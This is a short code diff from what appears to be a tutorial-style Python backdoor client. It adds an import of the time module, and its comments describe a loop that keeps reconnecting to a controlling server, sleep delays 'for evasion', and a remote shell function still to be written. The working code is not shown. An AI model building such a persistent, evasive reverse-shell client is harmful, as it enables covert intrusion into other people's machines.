@@ -2,6 +2,7 @@
 
 import socket
 import json
+import time # 12
 
 def ip_address():
     global server_ip
@@ -84,6 +85,7 @@ connection()
 # 11    Renamed and also added a while loop; so that it will always initiate to connect to the server.
 # 12    I also added time.sleep(0) which we are going to make 1-10 seconds in the future to avoid unnecessary errors
 #       and to delay the connection to the server (evasion)
+#       also imported a new module, time
 #       it will always try to connect to the server and if it has an error...
 # 13    It will try again to connect. similarly to the json_recv that we did.
 # 14    If it successfully connected to the server, We are now going to the shell fucntion which is not existed yet.
